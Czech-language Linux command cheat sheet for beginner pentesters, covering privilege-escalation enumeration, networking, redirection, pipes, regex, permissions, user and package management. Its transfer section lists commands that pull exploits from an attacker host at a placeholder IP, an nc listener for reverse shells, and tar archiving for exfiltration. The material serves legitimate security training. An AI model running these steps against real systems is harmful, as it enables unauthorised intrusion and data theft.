
### 👤 1. Enumerace uživatele (Kdo jsem a co můžu?)

| **Příkaz** | **Význam pro Pentestera**                                                                               |
| ---------- | ------------------------------------------------------------------------------------------------------- |
| `whoami`   | Zjistí tvé aktuální uživatelské jméno.                                                                  |
| `id`       | Ukáže tvé **UID/GID** a členství ve skupinách (např. skupina `docker` nebo `lxd` často vede k rootovi). |
| `sudo -l`  | Vypíše, které příkazy můžeš spouštět se zvýšeným oprávněním (hledáme cesty k **Privilege Escalation**). |
| `last`     | Ukáže historii přihlášení uživatelů (zjistíš aktivitu na stroji).                                       |

### 📂 2. Průzkum systému a souborů

|**Příkaz**|**Význam pro Pentestera**|
|---|---|
|`uname -a`|Verze jádra (Kernel). Klíčové pro hledání **Local Privilege Escalation (LPE)** exploitů.|
|`cat /etc/os-release`|Zjistí přesnou verzi a název distribuce (např. Ubuntu 20.04).|
|`ls -la`|Vypíše vše včetně **skrytých souborů** (hledáme `.ssh`, `.bash_history`, `.config`).|
|`find / -perm -4000 2>/dev/null`|Najde soubory se **SUID** bitem (programy, které běží pod rootem, i když je spustí běžný uživatel).|
|`history`|Zobrazí historii příkazů. Často tam najdeš zapomenutá hesla nebo cesty k citlivým datům.|

### 🌐 3. Síťová enumerace (Co běží "uvnitř"?)

| **Příkaz**       | **Význam pro Pentestera**                                                                           |
| ---------------- | --------------------------------------------------------------------------------------------------- |
| `ip a`           | Zobrazení IP adres a síťových rozhraní (hledáme další sítě pro **Pivoting**).                       |
| `ss -lntp`       | Ukáže naslouchající porty. Hledáme služby, které jsou přístupné jen zevnitř (localhost), ne zvenku. |
| `netstat -antp`  | Starší verze pro výpis síťových spojení a portů.                                                    |
| `cat /etc/hosts` | Může obsahovat IP adresy a názvy jiných strojů v interní síti.                                      |

### ⚙️ 4. Procesy a služby

|**Příkaz**|**Význam pro Pentestera**|
|---|---|
|`ps aux`|Vypíše všechny běžící procesy. Hledáme skripty nebo služby běžící pod uživatelem **root**.|
|`top`|Sledování vytížení systému v reálném čase.|
|`systemctl list-units --type=service`|Seznam běžících služeb (hledáme neobvyklé nebo zranitelné služby).|

### 🛠️ 5. Přenos souborů a manipulace

| **Příkaz**                        | **Význam pro Pentestera**                                        |
| --------------------------------- | ---------------------------------------------------------------- |
| `wget http://<IP>/file`           | Stažení tvých exploitů/skriptů z útočného stroje do oběti.       |
| `curl http://<IP>/file -o file`   | Alternativa k wget pro stahování souborů.                        |
| `nc -lvnp <port>`                 | Spuštění naslouchání (listener) pro získání **Reverse Shellu**.  |
| `tar -czvf backup.tar.gz /folder` | Komprimace složky pro rychlejší stažení (exfiltrace dat) k sobě. |

### 🛠️ Tabulka příkazů pro práci se soubory

Tady je slíbený Markdown kód pro tvůj "tahák":

| **Příkaz**     | **Význam**                         | **Příklad z praxe**                              |
| -------------- | ---------------------------------- | ------------------------------------------------ |
| **`touch`**    | Vytvoří prázdný soubor.            | `touch notes.txt`                                |
| **`mkdir`**    | Vytvoří složku.                    | `mkdir recon`                                    |
| **`mkdir -p`** | Vytvoří celou strukturu složek.    | `mkdir -p htb/machine1/logs`                     |
| **`mv`**       | Přesune nebo přejmenuje.           | `mv exploit.py /tmp/`                            |
| **`cp`**       | Zkopíruje soubor.                  | `cp config.php config.php.bak`                   |
| **`cp -r`**    | Zkopíruje celou složku.            | `cp -r /etc/ssh .` (zkopíruje SSH konfig k tobě) |
| **`tree`**     | Ukáže strukturu složek jako strom. | `tree ~`                                         |

### 🛠️ Tabulka vyhledávacích příkazů 

| **Příkaz**                  | **Výhoda**           | **Kdy ho použít?**                                                               |
| --------------------------- | -------------------- | -------------------------------------------------------------------------------- |
| **`which <nástroj>`**       | Okamžitý výsledek.   | Chci vědět, jestli můžu spustit `python` nebo `wget`.                            |
| **`locate <název>`**        | Rychlost.            | Hledám soubor, o kterém vím, že v systému je dlouho.                             |
| **`find <cesta> <filtry>`** | Přesnost a filtrace. | Hledám soubory se specifickými právy (např. SUID) nebo od konkrétního uživatele. |

### 🛠️ Tabulka editorů a příkazů pro čtení

|**Příkaz**|**Význam**|**Kdy ho použít?**|
|---|---|---|
|`cat soubor`|Vypíše obsah do terminálu.|Když chceš jen rychle přečíst flag nebo krátký text.|
|`nano soubor`|Jednoduchá editace.|Když potřebuješ rychle změnit jeden řádek v konfiguraci.|
|`vim soubor`|Profesionální editace.|Když píšeš skript nebo pracuješ s velkým kódem.|
|`vimtutor`|Výukový program pro Vim.|**Doporučuji!** Naučí tě ovládat Vim za 30 minut.|

### 🎟️ Co jsou deskriptory souborů?

Představ si je jako **pořadová čísla** v šatně (jak zmiňuje text). Systém se nezajímá o to, jestli vypisuješ text na monitor nebo do souboru, zajímá ho jen číslo "kanálu".

|**ID**|**Název**|**Zkratka**|**Význam**|
|---|---|---|---|
|**0**|**Standard Input**|`STDIN`|Vstup (klávesnice). Data tečou **DO** programu.|
|**1**|**Standard Output**|`STDOUT`|Výstup (obrazovka). Normální data tečou **Z** programu.|
|**2**|**Standard Error**|`STDERR`|Chybový výstup. Chybové hlášky tečou **Z** programu.|

### 🏹 Operátory přesměrování (Redirection)

Symboly `<` a `>` fungují jako šipky, které určují směr toku dat.

#### 1. Práce s výstupem (STDOUT a STDERR)

- **`>`**: Vytvoří soubor (nebo ho **přepíše**).
    
    - `find /etc -name shadow > vysledky.txt` (Uloží jen to, co se našlo).
        
- **`>>`**: **Přidá** data na konec existujícího souboru.
    
    - `echo "Další záznam" >> log.txt`
        
- **`2>`**: Přesměruje **pouze chyby**.
    
    - `find /etc -name shadow 2>/dev/null` (Chyby "Permission denied" zmizí v černé díře).
        
- **`&>`**: Přesměruje **vše** (výstup i chyby) do jednoho souboru.
    

#### 2. Práce se vstupem (STDIN)

- **`<`**: Pošle obsah souboru do programu.
    
    - `cat < soubor.txt`
        
- **`<< EOF` (Heredoc)**: Umožňuje psát více řádků textu přímo v terminálu, dokud nenapíšeš značku `EOF`. Skvělé pro vytváření skriptů nebo konfiguračních souborů za běhu.
    

---

### 🛠️ Potrubí (Pipes `|`)

Pipe je jeden z nejsilnějších nástrojů v Linuxu. Propojuje programy k sobě – výstup jednoho se stane vstupem druhého.

**Příklad z tvého textu:** `find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l`

1. **`find`**: Najde všechny `.conf` soubory (chyby zahodí do `/dev/null`).
    
2. **`|`**: Předá seznam dál.
    
3. **`grep systemd`**: Vyfiltruje jen ty řádky, kde je slovo "systemd".
    
4. **`|`**: Předá vyfiltrovaný seznam dál.
    
5. **`wc -l`**: Spočítá, kolik řádků (výsledků) zbylo.

### Nástroje pro transformaci (Pila a kladivo)

|**Nástroj**|**Účel**|**Příklad**|
|---|---|---|
|**`grep`**|Vyhledávání vzorů (textu).|`grep "bash"` (najde řádky s bash)|
|**`sort`**|Seřazení řádků (abecedně/číselně).|`cat users.txt|
|**`cut`**|Vyříznutí konkrétního sloupce.|`cut -d":" -f1` (vezme 1. slovo před dvojtečkou)|
|**`tr`**|Nahrazení nebo smazání znaků.|`tr ":" " "` (změní dvojtečky na mezery)|
|**`sed`**|Proudový editor (hledání a nahrazování).|`sed 's/bin/HTB/g'` (všude změní bin na HTB)|
|**`awk`**|Programovací jazyk pro práci se sloupci.|`awk '{print $1}'` (vypíše jen první sloupec)|
|**`wc -l`**|Počítadlo řádků.|Spočítá, kolik výsledků jsi našel.|

### 🧩 Základní kameny RegExu

RegEx není jen o slovech, ale o **metaznacích**, které říkají "jak" se má hledat.

|**Symbol**|**Název**|**Význam**|
|---|---|---|
|**`()`**|**Seskupování**|Spojuje části výrazu (např. pro operátor OR).|
|**`[]`**|**Třídy znaků**|Hledá jakýkoliv znak uvnitř (např. `[a-z]` najde malé písmeno).|
|**`{}`**|**Kvantifikátory**|Určuje počet opakování (např. `{3}` znamená přesně třikrát).|
|**`|`**|**OR (Nebo)**|
|**`.*`**|**AND (Logika)**|Tečka je jakýkoliv znak, hvězdička libovolný počet. Spojuje výrazy za sebou.|
|**`^`**|**Začátek**|Hledá vzor pouze na začátku řádku.|
|**`$`**|**Konec**|Hledá vzor pouze na konci řádku.|

### 🛠️ Příkazy pro změnu (chmod, chown)

- **`chmod`**: Mění **práva**.
    
    - Symbolicky: `chmod u+x skript.sh` (přidá vlastníku právo spustit).
        
    - Číselně: `chmod 644 konfigurace.conf` (standardní práva pro soubor).
        
- **`chown`**: Mění **vlastníka** a **skupinu**.
    
    - `sudo chown root:root tajny_soubor` (předá soubor rootovi).
- 

### 2. Správa účtů (Administrace)

|**Příkaz**|**Význam**|**Příklad použití**|
|---|---|---|
|**`useradd`**|Vytvoří nového uživatele.|`sudo useradd alex`|
|**`usermod`**|Upraví existujícího uživatele.|`sudo usermod -aG sudo alex` (přidá Alexe do skupiny sudo)|
|**`userdel`**|Smaže uživatele.|`sudo userdel -r alex` (smaže i jeho domovskou složku)|
|**`passwd`**|Změní heslo.|`sudo passwd root` (nastaví nové heslo pro roota)|

### 📦 Hlavní nástroje pro správu balíčků

|**Nástroj**|**Úroveň**|**Popis**|
|---|---|---|
|**`dpkg`**|Nízká|Instaluje konkrétní `.deb` soubory. Neřeší závislosti (pokud balíčku něco chybí, prostě selže).|
|**`apt`**|Vysoká|"Chytrý" nástroj. Sám si stáhne balíček z internetu a automaticky doinstaluje vše, co je k jeho běhu potřeba.|
|**`git`**|Zdrojový kód|Slouží ke stažení (klonování) nejnovějších verzí nástrojů přímo od vývojářů (často z GitHubu).|

### 🛠️ Praktické taháky pro APT (Debian/Kali)

Jako pentester budeš tyto příkazy používat denně:

- **`sudo apt update`**: Aktualizuje seznam dostupných balíčků ze serverů (repozitářů). **Tímto vždy začni.**
    
- **`apt-cache search <název>`**: Najde nástroj, pokud přesně nevíš, jak se jmenuje (např. `apt-cache search scanner`).
    
- **`sudo apt install <balíček>`**: Nainstaluje vybraný nástroj.
    
- **`apt list --installed`**: Ukáže ti, co už v systému máš.
    

> **Pentest Tip:** Pokud najdeš na GitHubu skvělý nástroj, který není v oficiálním repozitáři, použiješ **Git**: `git clone https://github.com/uzivatel/nastroj.git`


### ⚙️ Správa služeb přes `systemctl`

Většina moderních systémů používá **systemd** (PID 1). Je to "manažer všech manažerů".

- **`systemctl start <služba>`**: Spustí službu okamžitě.
    
- **`systemctl enable <služba>`**: Zajistí, že se služba spustí sama **po rebootu**.
    
- **`systemctl status <služba>`**: Klíčový příkaz pro debugging. Pokud služba neběží, uvidíš zde poslední řádky chybového logu.
    
- **`systemctl list-units --type=service`**: Rychlý přehled všeho, co v systému aktuálně běží.
    

---

### 💀 Ovládání procesů a signály

Když program zamrzne nebo ho chceš ukončit, posíláš mu **signál**.

|**Signál**|**Název**|**Účinek**|
|---|---|---|
|**9**|`SIGKILL`|**Kladivo.** Proces okamžitě ukončí bez možnosti cokoli uložit.|
|**15**|`SIGTERM`|**Prosba.** "Prosím, ukonči se." Proces má čas zavřít soubory a uklidit po sobě.|
|**19**|`SIGSTOP`|**Zmrazení.** Pozastaví proces v čase.|
